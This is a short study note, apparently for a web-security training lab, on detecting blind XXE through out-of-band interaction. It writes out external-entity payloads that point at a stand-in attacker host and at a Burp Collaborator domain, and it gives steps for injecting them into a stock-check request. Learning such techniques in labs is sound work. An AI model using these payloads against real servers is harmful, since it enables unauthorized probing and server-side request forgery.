## Introduction
- You can often detect blind XXE using the same technique as for [[Exploiting_XXE_to_perform_SSRF_attacks(lab-2)]] attacks but triggering the out-of-band network interaction to a system that you control.

**Example** - 
you would define an external entity as follows:
```python
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```
- You would then make use of the defined entity in a data value within the XML.
- This XXE attack causes the server to make a back-end HTTP request to the specified URL.
- The attacker can monitor for the resulting DNS lookup and HTTP request, and thereby detect that the XXE attack was successful.

## Steps to solve lab
### Desc - Blind XXE with out-of-band interaction
**Our end goal** - To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

1. Now, first we send the `POST /product/stock` to Burp "Repeater". 
![[XXE6.png]]

2. Now, add `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://vrqxnlz7g7gbb3t5r1qlvan7myspgf44.oastify.com"> ]>` below to the `XML` element and above the `stockCheck` element in the below request.
![[XXE7.png]]

Add collaborator domain and external entity in the place of data value as described below:
![[XXE8.png]]

**In burp collaborator tab click on "Poll Now"** - 
![[XXE9.png]]

